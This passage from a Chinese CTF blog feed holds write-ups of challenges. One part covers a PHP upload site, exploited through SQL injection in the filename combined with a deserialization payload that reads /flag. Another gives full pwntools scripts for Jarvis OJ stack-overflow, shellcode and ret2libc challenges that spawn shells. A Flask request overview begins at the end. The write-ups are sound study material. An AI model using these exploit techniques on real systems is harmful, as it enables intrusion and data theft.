class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>show.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Show Images&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;.&#x2F;style.css&quot;&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2 align&#x3D;&quot;center&quot;&gt;Your images&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;p&gt;The function of viewing the image has not been completed, and currently only the contents of your image name can be saved. I hope you can forgive me and my colleagues and I are working hard to improve.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(&quot;.&#x2F;helper.php&quot;);</span><br><span class="line">$show &#x3D; new show();</span><br><span class="line">if($_GET[&quot;delete_all&quot;])&#123;</span><br><span class="line">if($_GET[&quot;delete_all&quot;] &#x3D;&#x3D; &quot;true&quot;)&#123;</span><br><span class="line">$show-&gt;Delete_All_Images();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line">class show&#123;</span><br><span class="line">public $con;</span><br><span class="line"></span><br><span class="line">public function __construct()&#123;</span><br><span class="line">$this-&gt;con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);</span><br><span class="line">if (mysqli_connect_errno($this-&gt;con))&#123; </span><br><span class="line">   die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function Get_All_Images()&#123;</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM images&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($this-&gt;con, $sql);</span><br><span class="line">if ($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    while($row &#x3D; $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    if($row[&quot;attr&quot;])&#123;</span><br><span class="line">    $attr_temp &#x3D; str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);</span><br><span class="line">$attr &#x3D; unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        echo &quot;&lt;p&gt;id&#x3D;&quot;.$row[&quot;id&quot;].&quot; filename&#x3D;&quot;.$row[&quot;filename&quot;].&quot; path&#x3D;&quot;.$row[&quot;path&quot;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($this-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function Delete_All_Images()&#123;</span><br><span class="line">$sql &#x3D; &quot;DELETE FROM images&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($this-&gt;con, $sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;a href&#x3D;&quot;show.php?delete_all&#x3D;true&quot;&gt;Delete All Images&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href&#x3D;&quot;upload.php&quot;&gt;Upload Images&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>发现有<code>str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);</code>与</p><p><code>str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $value)</code>怀疑是反序列化逃逸。</p><p>顺着这条线，继续找反序列化点。发现show.php中的<code>$attr = unserialize($attr_temp);</code></p><p>而$attr_temp是由sql查询出来的<code>attr</code>来的。</p><p>但attr如何控制还是有点懵，再仔细审下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"r00t"</span>,<span class="string">"r00t"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现我们发送过来的文件先是被upload函数处理，把一些如filename、title、path那些文件信息提取出来。然后被insert_array存入数据库。而在存入时是以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES (&#39;&lt;title values&gt;&#39; ,&#39;&lt;filename values&gt;&#39;,&#39;&lt;ext values&gt;&#39;,&#39;&lt;path values&gt;&#39;,&#39;&lt;attr values&gt;&#39;)</span><br></pre></td></tr></table></figure><p>因此我们可以利用sql特性让filename的值为：</p><p><code>filename=”1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,xxxx)#1.jpg“</code></p><p>这样在插入时，插入语句就变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES (&#39;&lt;title values&gt;&#39; ,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,xxxx)#1.jpg&#39;,&#39;&lt;ext values&gt;&#39;,&#39;&lt;path values&gt;&#39;,&#39;&lt;attr values&gt;&#39;)</span><br></pre></td></tr></table></figure><p>在sql执行时，attr对应的是xxxx。这样attr就为我们所控制。</p><p>在利用helper 类的 __destruct()方法读取flag。</p><p>反序列化payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>但防止在中间过程中<code>”</code>产生误解，我们可以利用<code>将数据16进制存储也会被sql自动转</code>的sql特性。将数据转换为16进制。所以完整payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;&quot;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a313a7b733a393a22636f6e666967223b733a353a222f666c6167223b7d)#1.jpg&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210111212354400.png" alt="image-20210111212354400"></p><p><img src="image-20210111212838846.png" alt="image-20210111212838846"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xman pwn题复现——学pwn小记（4）</title>
      <link href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.<a id="more"></a></p><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>最简单的,栈溢出.</p><p><img src="image-20210113124043442.png" alt="image-20210113124043442"></p><p>只开了NX保护.看反汇编代码发现,有栈溢出点.同时内部有后门.</p><p><img src="image-20210113123620972.png" alt="image-20210113123620972"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level0'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'callsystem'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h2><p><img src="image-20210113131440686.png" alt="image-20210113131440686"></p><p>还是只开了nx保护.</p><p><img src="image-20210113132618818.png" alt="image-20210113132618818"></p><p>发现有栈溢出利用点与后门.</p><p>但是要注意的是这道题的mian函数.</p><p><img src="image-20210113132742912.png" alt="image-20210113132742912"></p><p>我们正常的mian函数一般是如下:</p><p><img src="image-20210113132512530.png" alt="image-20210113132512530"></p><p>即是有:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push rbp     <span class="comment">#把上一个栈的rbp入栈</span></span><br><span class="line">mov rbp,rsp</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">leave    <span class="comment"># leave 相当于mov esp,ebp;pop ebp;</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>我们在平常里构造栈出时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf+(0xbeadcade)+恶意code</span><br></pre></td></tr></table></figure><p>0xbeadcade的数据就为了平衡leave中的pop，因此在本题目中mian函数没有pop ebp或leave。因此payload不需要加(0xbeadcade)。</p><p>exp：</p><p><img src="image-20210113135133488.png" alt="image-20210113135133488"></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>一个32位的程序，什么保护也没有开。</p><p><img src="image-20210113135547290.png" alt="image-20210113135547290"></p><p>反汇编看，发现buf有可控栈溢出，同时提示了buf地址猜测可以手动入shell。</p><p><img src="image-20210113135742482.png" alt="image-20210113135742482"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'level1'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="comment">#p=process('level1')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's this:"</span>)</span><br><span class="line">addr=p.recvuntil(<span class="string">"?"</span>)[:<span class="number">-1</span>]</span><br><span class="line">print(addr)</span><br><span class="line">addr=int(addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pay1=asm(shellcraft.sh())</span><br><span class="line">pay1=pay1.ljust(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">pay1=pay1+p32(<span class="number">0</span>)+p32(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="image-20210113140015120.png" alt="image-20210113140015120"></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="image-20210113140431065.png" alt="image-20210113140431065"></p><p>一个32位的程序，只NX保护。看反汇编代码发现栈溢出利用点。</p><p><img src="image-20210113140350462.png" alt="image-20210113140350462"></p><p>同时环境中有system函数，我们可以利用ret2libc的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level2'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)<span class="comment">#process('level2')</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0x0804A024</span>)+p32(<span class="number">0x0804A024</span>)<span class="comment">#0x0804A024为/bin/sh地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>环境与32位的环境差不多，但是x64的传参与x32下不同。</p><p>x64中前6个参数是按顺序从 rdi ，rsi ，rdx，rcx，r8，r9这6寄存器传递参数的。x32是纯通过栈来传递参数的。因此我们可以用：</p><p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code>来寻找我们可以利用的gadget。</p><p><img src="image-20210113141628743.png" alt="image-20210113141628743"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level2_x64'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)<span class="comment">#process('level2_x64')</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00000004006b3</span>)+p64(<span class="number">0x00000600A90</span>)+p64(e.plt[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h2><p>为一个64位的程序只开了nx保护。</p><p><img src="image-20210113142124824.png" alt="image-20210113142124824"></p><p>发现栈溢出点但是环境中没有sytstem与<code>/bin/sh</code></p><p>因此我们要泄露出libc版本。ps：在做时，发现LibcSearcher泄露出来不准，因此用leak方法来做的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9884</span>)</span><br><span class="line"><span class="comment">#context.update(bits=64)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(address)+p64(<span class="number">1</span>)+p64(<span class="number">0x0000000400690</span>)+<span class="string">'\00'</span>*<span class="number">56</span>+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">        p.recvline()</span><br><span class="line">add=p.recv(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> add</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'read'</span>])+p64(<span class="number">8</span>)+p64(<span class="number">0x00000000600A88</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x0000000400690</span>)+<span class="string">'\00'</span>*<span class="number">56</span>+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x000004006b3</span>)+p64(<span class="number">0x00000000600A88</span>)+p64(system_addr)+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>方法与level3差不多，leak出libc版本，然后ret2libc。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'level4'</span>)</span><br><span class="line"><span class="comment">#p=process('level4')</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(e.plt[<span class="string">'write'</span>])+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> add</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">read_plt=e.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(read_plt)+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A024</span>)+p32(<span class="number">8</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(system_addr)+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask.request的内置属性总结</title>
      <link href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/"/>
      <url>/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>对于一个基于flask的web来说,Request是默认存在且有很多功能离不开Request.request对象是一个Request子类，提供了Werkzeug定义的所有属性以及一些Flask特定的属性。这导致我们有时可以控制request对象来处理一些数据.</p><a id="more"></a><h2 id="accept-encodings"><a href="#accept-encodings" class="headerlink" title="accept_encodings"></a>accept_encodings</h2><p>该客户端接受的编码列表。是处理http包中的<code>Accept-Encoding</code>头的数据.</p><p><img src="image-20201231221711608.png" alt="image-20201231221711608"></p><p>accept_encodings接受的数据是用list类型来保存的.list中的元素是元组存在的.</p><p><img src="image-20201231222115756.png" alt="image-20201231222115756"></p><p>accept_encodings中的数据是以空格或逗号(<code>,</code>)来进行分割的.<img src="image-20201231222535177.png" alt="image-20201231222535177"></p><h2 id="accept-charsets"><a href="#accept-charsets" class="headerlink" title="accept_charsets"></a>accept_charsets</h2><p>该客户端支持的字符集列表.是处理http包中的<code>Accept-Charset</code>头的数据。</p><p><img src="image-20201231223255289.png" alt="image-20201231223255289"></p><p>accept_charsets接受的数据是用list类型来保存的.list中的元素是元组存在的.</p><p><img src="image-20201231223321225.png" alt="image-20201231223321225"></p><p>accept_charsets和accept_encodings相同数据是以空格或逗号(<code>,</code>)来进行分割的.</p><h2 id="accept-languages"><a href="#accept-languages" class="headerlink" title="accept_languages"></a>accept_languages</h2><p>此客户端接受的语言列表。是处理http包中的<code>Accept-Language</code>头的数据。</p><p><img src="image-20201231224106709.png" alt="image-20201231224106709"></p><p>accept_languages接受的数据是用list类型来保存的.list中的元素是元组存在的.</p><p><img src="image-20201231224141646.png" alt="image-20201231224141646"></p><p>accept_languages数据也是以空格或逗号(<code>,</code>)来进行分割的.</p><h2 id="accept-mimetypes"><a 